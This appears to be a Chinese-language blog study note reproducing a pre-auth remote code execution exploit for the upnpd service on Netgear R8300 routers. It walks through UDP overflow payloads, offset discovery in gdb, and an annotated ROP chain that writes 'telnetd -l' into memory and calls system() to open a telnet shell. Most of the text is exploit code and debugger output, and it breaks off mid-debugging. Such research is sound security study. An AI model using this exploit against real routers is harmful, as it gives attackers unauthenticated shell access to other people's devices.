+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    <span class="number">0x604</span> * <span class="string">b'a'</span> +  <span class="comment"># dummy</span></span><br><span class="line">    p32(<span class="number">0x7e2da53c</span>) +  <span class="comment"># v41</span></span><br><span class="line">    (<span class="number">0x634</span> - <span class="number">0x604</span> - <span class="number">8</span>) * <span class="string">b'a'</span> +  <span class="comment"># dummy</span></span><br><span class="line">    p32(<span class="number">0x43434343</span>)  <span class="comment"># LR</span></span><br><span class="line">)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># 2 </span></span><br><span class="line">g = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line">g(<span class="number">1</span>)&gt;&gt;&gt;<span class="number">2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="string">"&lt;L"</span>，小端，unsigned long <span class="number">4</span>字节</span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">socket.SOCK_DGRAM，upnpd是upd</span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">p32(<span class="number">0x7e2da53c</span>)，十六进制转为bytes</span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line">upnpd是<span class="number">1900</span>端口，netstat -atp可见，但设备不支持p，故Google</span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">payload的构造要通过动态调试</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>搭建调试环境</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">./gdbserver-7.7.1-armel-eabi5-v1-sysv --attach :1234 `ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line">Attached; pid = 2617</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.1.1</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line">gdb-multiarch usr/sbin/upnpd</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot .</span><br><span class="line">gef➤  target remote 192.168.1.2:1234</span><br><span class="line">0x76d1a4c8 <span class="keyword">in</span> select () from ./lib/libc.so.0<span class="comment"># 连接后自动断在此处</span></span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>pwntools确定偏移</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">con = remote(<span class="string">'192.168.1.2'</span>,1900)一直失败，故用socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 局部变量大小=0x5dc=1500，因此payload=1600*'a'</span></span><br><span class="line">import socket</span><br><span class="line">payload = 1600 * <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># 但不符合预期，并没有控制pc为'aaaa'</span></span><br><span class="line"><span class="comment"># 总是断在strstr，0x76e01954 in strstr () from ./lib/libc.so.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 推测在return之前就崩溃了，再回到代码</span></span><br><span class="line">signed int __fastcall sub_25E04(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-634h]<span class="comment"># 目标局部变量</span></span><br><span class="line">  int s; // [sp+600h] [bp-58h]</span><br><span class="line">  int *v51; // [sp+628h] [bp-30h]<span class="comment"># 指针</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  v51 = &amp;v40;<span class="comment"># 指向v40</span></span><br><span class="line">  strcpy((char *)&amp;v40, v3);</span><br><span class="line">  v7 = sub_B60C((const char **)&amp;v51, (const char *)&amp;v52);<span class="comment"># 指针作为参数1传入</span></span><br><span class="line"><span class="comment"># *a1对指针解引用，指针也被覆盖为aaaa，自然崩溃</span></span><br><span class="line">const char *__fastcall sub_B60C(const char **a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">    v5 = strstr(*a1, a2);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 构造payload时要注意：栈上有个指针v41指向v39的，覆盖的时候要将其指向有效地址，否则还没到return控制pc，就在strstr那崩溃了</span></span><br><span class="line">0x634-0x30 = 0x604</span><br><span class="line">在gdb中，target remote连接上后，会自动断在0x76d1a4c8，可直接用这个（不要写死，运行exp.py前再改，因为会变</span><br><span class="line">直接找一个字符串的地址，其不会变，如ida中.data:000556FC aMacBook        DCB <span class="string">"Mac Book"</span>,0</span><br><span class="line">gdb中：gef➤  x/1s 0x000556FC得到0x556fc:	<span class="string">"Mac Book"</span></span><br><span class="line">实测选择<span class="string">"Mac Book"</span>字符串有问题，exp后gdb断不下来</span><br><span class="line">const char *__fastcall sub_B60C(const char **a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">    v5 = strstr(*a1, a2);</span><br><span class="line">  v52 = <span class="string">' '</span>;</span><br><span class="line">  v7 = sub_B60C((const char **)&amp;v51, (const char *)&amp;v52);</span><br><span class="line">可能是<span class="string">"Mac Book"</span>找到了空格，影响了程序的执行，注意这点</span><br><span class="line"></span><br><span class="line">.data:00055666 aIphone         DCB <span class="string">"iPhone"</span>,0</span><br><span class="line">gef➤  x/1s 0x00055666</span><br><span class="line">0x55666:	<span class="string">"iPhone"</span></span><br><span class="line">还是不行</span><br><span class="line"></span><br><span class="line">strcpy，0x00055666，有00字符，截断了，自然没有崩</span><br><span class="line"></span><br><span class="line">那字符串就不行了，其地址都带着00</span><br><span class="line">选函数地址，如system，rop+system的利用方式，是直接将system函数地址写死在payload中的，可证明其地址不变，如果恰好包含0，再找其他库函数</span><br><span class="line">gef➤  x/10i system</span><br><span class="line">   0x76df6270 &lt;system&gt;:	ldr	r3, [pc, <span class="comment">#324]	; 0x76df63bc &lt;system+332&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原ssd文章也如此：https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</span></span><br><span class="line">In order to successfully change the PC value, we need to reach the <span class="built_in">return</span> part of vulFunction. We have to <span class="built_in">set</span> its value to an existing pointer value that exists <span class="keyword">in</span> memory (other loaded libraries <span class="built_in">functions</span>).</span><br><span class="line"><span class="comment"># 另一篇文章中：https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</span></span><br><span class="line">由于libc库对应的加载基址比较大，即其最高字节不为\x00，因此任意选取该范围内的一个不包含\x00的有效地址即可。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x00055666) +	<span class="comment"># v41</span></span><br><span class="line">    100 * <span class="string">'a'</span> <span class="comment"># 前二都是栈上局部变量，因此控制pc在此</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">成功控制pc</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x61616160 in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x61616160 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>确定偏移</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    cyclic(100)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x6161616a in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x6161616a <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤ </span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic -l 0x6161616a</span><br><span class="line">36</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic -l 0x6161616b</span><br><span class="line">40</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意到之前aaaa时，pc为0x61616160，故pc为0x6161616a，找位置时要再+1，因为要对齐，奇数要变为偶数</span></span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    40 * <span class="string">'a'</span> + </span><br><span class="line">    <span class="string">'bbbb'</span> <span class="comment"># pc</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x62626262 in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x62626262 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤  </span><br><span class="line"></span><br><span class="line">验证正确</span><br><span class="line"></span><br><span class="line">控制pc处的偏移为：</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    40 * <span class="string">'a'</span> + </span><br><span class="line">    <span class="string">'bbbb'</span> <span class="comment"># pc</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004939.jpg" alt="image-20201118152102149"></p>
+<ol start="6">
+<li><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">显然，R4 - R11 也是可控的，思考一下目前的情况：</span><br><span class="line"></span><br><span class="line">开了 NX 不能用 shellcode。</span><br><span class="line">有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget。</span><br><span class="line">strcpy() 函数导致的溢出，payload 中不能包含 \x00 字符。</span><br><span class="line"></span><br><span class="line">其实可控 PC 后已经可以干很多事了，upnpd 内包含大量 system 函数调用，比如 reboot。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h2 id="SSD"><a href="#SSD" class="headerlink" title="SSD"></a>SSD</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</a></p>
+<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004938.jpg" alt="image-20201120164905786"></p>
+<h3 id="文章内容"><a href="#文章内容" class="headerlink" title="文章内容"></a>文章内容</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ASLR Bypassing through Stack Reuse</span><br><span class="line"></span><br><span class="line">The router has the ASLR mitigation turned on, <span class="built_in">which</span> we can bypass using a ROP Attack. However, we are performing a copy call through the use of strcpy, <span class="built_in">which</span> is sensitive to NULL bytes, <span class="built_in">which</span> would <span class="keyword">in</span> turn prevent us to use the ROP attack. Therefore to utilize an address that contains a NULL byte, we will need to use a stack reuse attack.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># NX阻止shellcode在栈上执行，可用ret2libc绕过</span></span><br><span class="line"><span class="comment"># 但ASLR可阻止ret2libc：因为使得lib的加载基址不确定</span></span><br><span class="line"><span class="comment"># ROP可绕过ASLR：ret2libc属于狭义上的ROP，要跳到libc中，直接执行其中的system函数，而广义上的ROP，既可用libc中的指令，又可用自己程序本身的指令，比如BL system，这里说的ROP即用自己指令的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># strcpy存在00截断，会阻止ROP：通过checksec查看upnpd，发现加载基址0x8000，故.text段地址的最高字节均为\x00，因此构造的rop chain一定会包含00，所以与strcpy不允许出现00相矛盾</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 通过stack reuse可绕过上述限制：</span></span><br><span class="line"><span class="comment"># 一般像这种 ROP 的 payload 中包含 \x00，覆盖返回地址的payload 又不能包含 \x00，就要想办法提前将 ROP payload 注入目标内存</span></span><br><span class="line"></span><br><span class="line">We will <span class="keyword">do</span> this by combining two payloads, the composition of first payload is as follows:</span><br><span class="line">    s.send(<span class="string">'a\x00'</span>+expayload) <span class="comment">#expayload is rop gadget</span></span><br><span class="line">We will be sending a “a\x00” value at the beginning of the payload to avoid triggering the UPNP vulnerability, until our payload is <span class="keyword">in</span> the the stack.</span><br><span class="line">The second payload will control the PC value and change it to 0x230f0 and trigger the first payload <span class="keyword">in</span> the stack. 0x230f0 gadget can control stack pointer.</span><br><span class="line">    .text:000230F0                 ADD             SP, SP, <span class="comment">#0x20C</span></span><br><span class="line">    .text:000230F4                 ADD             SP, SP, <span class="comment">#0x1000</span></span><br><span class="line">    .text:000230F8                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span><br><span class="line">We decided to use the BSS area of 0x9E150 to place our strings that we will later use <span class="keyword">for</span> exploitation. Using strcpy gadget 0x13648 and string gadget <span class="keyword">in</span> the binary, we can create the exploiting payload and execute system gadget 0x1A83C.</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 第一次send，发送00+expayload，00防止触发strcpy的溢出漏洞，expayload中是rop gadget（调用strcpy将二进制中字符串gadget拷贝到bss中，来拼接出command字符串，随后调用system执行command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 第二次send，发送payload，通过溢出控制pc为0x230F0，此gadget能控制栈帧，从而找到第一次send的expayload，进而执行expayload中的rop chain（strcpy拼接command字符串、system执行command）</span></span><br></pre></td></tr></table></figure>
+<h3 id="exp注解"><a href="#exp注解" class="headerlink" title="exp注解"></a>exp注解</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 &lt;小端、L unsigned long </span></span><br><span class="line">p32 = lambda x: pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 通过replace方法（不同于payload=a+b方法）</span></span><br><span class="line"><span class="comment"># payload中控制pc到此gadget：add sp找到第一次的expayload在栈中位置、LDMFD来控制pc到下一gadget</span></span><br><span class="line">payload = <span class="string">'xxxxxx'</span><span class="comment"># 大量字符</span></span><br><span class="line">expayload = <span class="string">''</span></span><br><span class="line">payload = payload.replace(<span class="string">'z3Bz'</span>,<span class="string">'\x70\x62\xdf\x76'</span>) <span class="comment"># 有效的地址，因为在return前，strstr函数会*p解引用</span></span><br><span class="line">payload = payload.replace(<span class="string">' AAA '</span>,<span class="string">'\xf0\x30\x02\x00'</span>) <span class="comment"># 控制的pc</span></span><br><span class="line"><span class="comment"># .text:000230F0                 ADD             SP, SP, #0x20C</span></span><br><span class="line"><span class="comment"># .text:000230F4                 ADD             SP, SP, #0x1000</span></span><br><span class="line"><span class="comment"># .text:000230F8                 LDMFD           SP!, &#123;R4-R11,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 strcpy的dst，保存拼接后的command字符串</span></span><br><span class="line">bssBase = 0x9E150   <span class="comment">#string bss BASE Address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 dst为bss，src为程序中的string gadget</span></span><br><span class="line">expayload += <span class="string">'a'</span> * 4550</span><br><span class="line">expayload += p32(bssBase+3) <span class="comment"># R4 Register</span></span><br><span class="line">expayload += p32(0x3F340) <span class="comment"># R5 Register //tel</span></span><br><span class="line">expayload += <span class="string">'IIII'</span> <span class="comment"># R6 Register</span></span><br><span class="line">expayload += <span class="string">'HHHH'</span> <span class="comment"># R7 Register</span></span><br><span class="line">expayload += <span class="string">'GGGG'</span> <span class="comment"># R8 Register</span></span><br><span class="line">expayload += <span class="string">'FFFF'</span> <span class="comment"># R9 Register</span></span><br><span class="line">expayload += p32(bssBase) <span class="comment"># R10 Register</span></span><br><span class="line">expayload += <span class="string">'BBBB'</span> <span class="comment"># R11 Register</span></span><br><span class="line">expayload += p32(0x13644) <span class="comment"># strcpy</span></span><br><span class="line"><span class="comment"># .text:00013644                 MOV             R0, R10 ; dest</span></span><br><span class="line"><span class="comment"># .text:00013648                 MOV             R1, R5  ; src</span></span><br><span class="line"><span class="comment"># .text:0001364C                 BL              strcpy</span></span><br><span class="line"><span class="comment"># .text:00013650                 MOV             R0, R4</span></span><br><span class="line"><span class="comment"># .text:00013654                 ADD             SP, SP, #0x5C</span></span><br><span class="line"><span class="comment"># .text:00013658                 LDMFD           SP!, &#123;R4-R8,R10,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 只指定src就可了，dst还是之前的bss，因此跳到0x13648，无需设置r0了</span></span><br><span class="line">expayload += <span class="string">'d'</span>*0x5c<span class="comment">#dummy</span></span><br><span class="line">expayload += p32(bssBase+6) <span class="comment">#R4</span></span><br><span class="line">expayload += p32(0x423D7) <span class="comment">#R5  //telnet</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R6</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R7</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R8 </span></span><br><span class="line">expayload += <span class="string">'d'</span>*4 <span class="comment">#R10</span></span><br><span class="line">expayload += p32(0x13648) <span class="comment">#strcpy</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 command字符串拼接完后，执行system，r4保存bss即command字符串，随后赋值给r0</span></span><br><span class="line"><span class="comment"># .text:0001A83C                 MOV             R0, R4  ; command</span></span><br><span class="line"><span class="comment"># .text:0001A840                 BL              system</span></span><br><span class="line">expayload += <span class="string">'d'</span>*0x5c<span class="comment">#dummy</span></span><br><span class="line">expayload += p32(bssBase) <span class="comment">#R4</span></span><br><span class="line">expayload += p32(0x47398) <span class="comment">#R5 </span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R6</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R7</span></span><br><span class="line">expayload += <span class="string">'c'</span>*4 <span class="comment">#R8</span></span><br><span class="line">expayload += <span class="string">'d'</span>*4 <span class="comment">#R10</span></span><br><span class="line">expayload += p32(0x1A83C) <span class="comment">#system(string) telnetd -l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 send两次，第一次保存expayload（rop chain）到栈，第二次溢出控制pc，从而执行第一次的rop chain</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, 1900))</span><br><span class="line">s.send(<span class="string">'a\x00'</span>+expayload)<span class="comment">#expayload is rop gadget </span></span><br><span class="line">s.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8 检查某端口是否开启，若无异常即成功</span></span><br><span class="line">def checkExploit():</span><br><span class="line">    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        ret = soc.connect((<span class="string">'192.168.1.2'</span>,9999))</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> 0</span><br></pre></td></tr></table></figure>
+<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 exp中payload控制pc为0x000230F0，提前下断</span></span><br><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ gdb-multiarch usr/sbin/upnpd</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot .</span><br><span class="line">gef➤  target remote 192.168.1.2:1234</span><br><span class="line">0x76d6a4c8 <span class="keyword">in</span> select () from ./lib/libc.so.0</span><br><span class="line">gef➤  b *0x000230F0</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="comment"># 2 exp后成功断下</span></span><br><span class="line"> →    0x230f0                  add    sp,  sp,  <span class="comment">#524	; 